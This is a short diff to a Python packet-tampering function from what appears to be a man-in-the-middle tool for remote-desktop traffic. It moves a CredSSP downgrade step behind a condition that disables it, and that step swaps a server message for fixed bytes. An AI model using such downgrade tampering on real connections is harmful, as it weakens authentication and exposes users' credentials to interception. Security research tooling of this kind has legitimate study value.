@@ -608,16 +608,19 @@ def tamper_data(bytes, From="Client"):
     if m:
         result = set_fake_requested_protocol(bytes, m)
 
-        # MARKER3
-    regex = b"\x30.\xa0.*\x6d"
-    m = re.match(regex, bytes)
     global downgrade_credssp
     global server_challenge
-    if m and "server_challenge" in globals() and From == "Server":
-        if (not "downgrade_credssp" in globals()):
+        # MARKER3
+    if (False and From == "Server"
+        and "server_challenge" in globals()
+        and not "downgrade_credssp" in globals()
+       ):
+        regex = b"\x30.\xa0.*\x6d"
+        m = re.match(regex, bytes)
+        if m:
             print("Downgrading CredSSP")
             downgrade_credssp = True
-            result = b"\x30\x0D\xA0\x03\x02\x01\x04\xA4\x06\x02\x04\xC0\x00\x00\x5E"
+            result = unhexlify(b"300da003020104a4060204c000005e")
 
 
     if not result == bytes and args.debug:
